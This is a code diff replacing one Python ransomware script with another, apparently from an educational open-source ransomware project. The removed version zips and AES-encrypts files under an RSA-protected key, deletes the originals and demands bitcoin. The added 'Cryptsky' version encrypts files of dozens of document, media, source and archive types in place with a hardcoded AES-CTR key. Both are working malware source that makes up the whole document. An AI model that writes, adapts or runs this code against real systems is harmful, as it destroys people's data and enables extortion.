@@ -1,150 +1,119 @@
-import os
+from Crypto.Cipher import AES
+from Crypto.Util import Counter
+from random import random
 import sys
-import random
-import string
-import struct
-import zipfile
-from Crypto.PublicKey import RSA
-from Crypto.Random import get_random_bytes
-from Crypto.Cipher import AES, PKCS1_OAEP
-
-# Files:
-# ~/.ransom
-# data.zip (temp)
-# data.enc
-# .key (encrypted AES key using RSA public key)
-# .clear_key (rescue key)
-wd = ['./test_files']  # '/home' '/media'
-# ALL option to read fstab and try to mount all its contents and search recursively at each mount point.
-extensions = ["txt", "c", "rb", "cpp", "jpg"]
-btc_wallet = "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy"  # not real
+import os
 
 
-def find_files(wd):
-    files = []
-    for dirname, dirnames, filenames in os.walk(wd):
-        for filename in filenames:
-            if filename.split('.')[-1] in extensions:
-                files.append(os.path.join(dirname, filename))
-    return files
+HARDCODED_KEY = 'yellow submarine'
+ENCRYPTED_EXTENSION = 'crypt3d'
 
 
-def zip_files(files):
-    zipname = os.path.expanduser("~/.ransom/data.zip")
-    with zipfile.ZipFile(zipname, mode='w', compression=zipfile.ZIP_DEFLATED) as zf:
-        for path in files:
-            zf.write(path)
+def discoverFiles(startpath, decrypt):
+    if decrypt:
+        extensions = [ENCRYPTED_EXTENSION]
+    else:
+        extensions = [
+            # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
+            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
+            'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
+            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies
+
+            'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
+            # OpenOffice, Adobe, Latex, Markdown, etc
+            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
+            'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
+            'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images
+
+            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies
+            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # C source code
+            'java', 'class', 'jar',  # java source code
+            'ps', 'bat', 'vb',  # windows based scripts
+            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # linux/mac based scripts
+            'go', 'py', 'pyc', 'bf', 'coffee',  # other source code files
+
+            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
+        ]
+
+    for dirpath, dirs, files in os.walk(startpath):
+        for i in files:
+            absolute_path = os.path.abspath(os.path.join(dirpath, i))
+            ext = absolute_path.split('.')[-1]
+            if ext in extensions:
+                yield absolute_path
 
 
-def remove_files(files):
-    for path in files:
-        os.remove(path)
+def modifyFile(filename, crypto, decrypt, blocksize=16):
+    with open(filename, 'r+b') as f:
+        plaintext = f.read(blocksize)
+
+        while plaintext:
+            ciphertext = crypto(plaintext)
+            if len(plaintext) != len(ciphertext):
+                raise ValueError('''Ciphertext({})is not of the same length of the Plaintext({}).
+                Not a stream cipher.'''.format(len(ciphertext), len(plaintext)))
+
+            f.seek(-len(plaintext), 1)
+            f.write(ciphertext)
+
+            plaintext = f.read(blocksize)
+
+    if decrypt and filename.endswith(ENCRYPTED_EXTENSION):
+        os.rename(filename, filename[:-len(ENCRYPTED_EXTENSION)-1])
+    else:
+        os.rename(filename, filename + '.' + ENCRYPTED_EXTENSION)
 
 
-def encrypt_symmetric_key(key):
-    file_out = open(os.path.expanduser("~/.ransom/.key"), "wb")
-    recipient_key = RSA.importKey(open("key").read())
-    # Encrypt the session key with the public RSA key
-    cipher_rsa = PKCS1_OAEP.new(recipient_key)
-    file_out.write(cipher_rsa.encrypt(key))
+def main():
+    decrypt = len(sys.argv) > 1 and sys.argv[1] == "-d"
 
+    if decrypt:
+        print('''
+Cryptsky!
+---------------
+Your files have been encrypted. This is normally the part where I would
+tell you to pay a ransom, and I will send you the decryption key. However, this
+is an open source project to show how easy malware can be to write and to allow
+others to view what may be one of the first fully open source python ransomwares.
 
-def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
-    if not out_filename:
-        out_filename = in_filename + '.enc'
-    iv = ''.join(random.choice(string.digits) for _ in range(16))
-    encryptor = AES.new(key, AES.MODE_CBC, iv)
-    filesize = os.path.getsize(in_filename)
-    with open(in_filename, 'rb') as infile:
-        with open(out_filename, 'wb') as outfile:
-            outfile.write(struct.pack('<Q', filesize))
-            outfile.write(str.encode(iv))
-            while True:
-                chunk = infile.read(chunksize)
-                if len(chunk) == 0:
-                    break
-                elif len(chunk) % 16 != 0:
-                    chunk += str.encode(' ' * (16 - len(chunk) % 16))
-                outfile.write(encryptor.encrypt(chunk))
+This project does not aim to be malicious. The decryption key can be found
+below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
+your files forever. Do not include the surrounding quotes, but do make sure
+to match case, special characters, and anything else EXACTLY!
+Happy decrypting and be more careful next time!
 
+Your decryption key is: '{}'
 
-def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
-    if not out_filename:
-        out_filename = os.path.splitext(in_filename)[0]
-    with open(in_filename, 'rb') as infile:
-        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
-        iv = infile.read(16)
-        decryptor = AES.new(key, AES.MODE_CBC, iv)
-        with open(out_filename, 'wb') as outfile:
-            while True:
-                chunk = infile.read(chunksize)
-                if len(chunk) == 0:
-                    break
-                outfile.write(decryptor.decrypt(chunk))
-            outfile.truncate(origsize)
+'''.format(HARDCODED_KEY))
+        key = input('Enter Your Key> ')
 
+    else:
+        # In real ransomware, this part includes complicated key generation,
+        # sending the key back to attackers and more
+        # maybe I'll do that later. but for now, this will do.
+        if HARDCODED_KEY:
+            key = HARDCODED_KEY
 
-def ransom_data():
-    if not os.path.isdir(os.path.expanduser("~/.ransom/")):
-        os.mkdir(os.path.expanduser("~/.ransom/"))
-    # locate files (save the path to a text file)
-    files = []
-    for swd in wd:
-        files += find_files(swd)
-    # compress files
-    zip_files(files)
-    # encrypt the compressed file with the random string using AES
-    key = get_random_bytes(32)
-    encrypt_file(key, os.path.expanduser("~/.ransom/data.zip"),
-                 out_filename=os.path.expanduser("~/.ransom/data.enc"))
-    # store the random string encrypted with the RSA public key .key
-    encrypt_symmetric_key(key)
-    # delete the files
-    remove_files(files)
-    os.remove(os.path.expanduser("~/.ransom/data.zip"))
-    # display message asking for redemption showing encrypted random string and indicating where to deposit the money.
-    print("If you want to recover your files deposit 1 btc at the following address:")
-    print(btc_wallet)
-    print("The decryption key will be sent to you, once the payment has been confirmed.")
-    # can be displayed when logging in, when starting the graphical environment, when opening a shell ...
+        # else:
+        #     key = random(32)
 
+    ctr = Counter.new(128)
+    crypt = AES.new(key.encode("utf8"), AES.MODE_CTR, counter=ctr)
 
-def rescue_data():
-    # pay bitcoins and send encrypted key to attacker
-    # attacker (optional)
-                 # check bitcoins
-                 # decrypt encrypted key with private key
-                 # send decrypted .clear_key key and paste into directory
-    # insert rescue key
-    key = None
-    try:
-        key = open(os.path.expanduser("~/.ransom/.clear_key"), 'rb').read()
-    except:
-        print("[-] Pay to get the key and recover your files.\n[-] Deposit the key .clear_key in the directory ~/.ransom/")
-        exit(1)
-    # decrypt the file
-    decrypt_file(key, os.path.expanduser("~/.ransom/data.enc"),
-                 out_filename=os.path.expanduser("~/.ransom/data.zip"))
-    # decompress
-    zip_ref = zipfile.ZipFile(os.path.expanduser("~/.ransom/data.zip"), 'r')
-    zip_ref.extractall(os.path.expanduser("~/.ransom/"))
-    zip_ref.close()
-    # clean
-    os.remove(os.path.expanduser("~/.ransom/data.zip"))
-    os.remove(os.path.expanduser("~/.ransom/data.enc"))
-    os.remove(os.path.expanduser("~/.ransom/.key"))
-    os.remove(os.path.expanduser("~/.ransom/.clear_key"))
+    # change this to fit your needs.
+    startdirs = ['./testing', './test_files']
+
+    for currentDir in startdirs:
+        for file in discoverFiles(currentDir, decrypt):
+            print(file)
+            modifyFile(file, crypt.encrypt, decrypt)
+
+    if not decrypt:
+        pass
+        # post encrypt stuff
+        # desktop picture
+        # icon, etc
 
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        if sys.argv[1] == "-r":
-            rescue_data()
-    else:
-        ransom_data()
-# ALL
-# data that can be obtained dynamically in the victim's machine
-    # public key (in a file)
-    # portfolio management bitcoin
-# data sent to the attacker
-    # encryption symmetric key rescue request, btc transaction identifier, asymmetric key identifier (if multiple)
+    main()
